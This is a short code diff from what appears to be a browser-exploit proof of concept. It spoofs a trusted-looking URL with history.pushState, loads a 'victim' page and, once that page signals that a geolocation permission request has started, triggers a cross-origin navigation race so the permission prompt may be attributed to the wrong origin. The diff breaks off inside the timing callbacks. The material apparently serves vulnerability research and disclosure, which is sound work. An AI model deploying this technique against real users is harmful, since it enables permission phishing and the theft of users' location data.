@@ -33,15 +33,21 @@ button {
 const start = document.getElementById('start');
 
 start.onclick = () => {
-  // Step 1: Fake trusted URL
+  // Step 1: Make URL look trusted
   history.pushState({}, '', '/maps');
 
   // Step 2: Load victim UI
   location.href = '/victim.html';
 };
 
-// Step 3: Navigation race after permission flow starts
-window.addEventListener('pageshow', () => {
+/*
+ * Step 3:
+ * Wait for victim.html to start permission flow,
+ * then trigger cross-origin navigation race
+ */
+window.addEventListener('message', (e) => {
+  if (e.data !== 'geo-request-started') return;
+
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
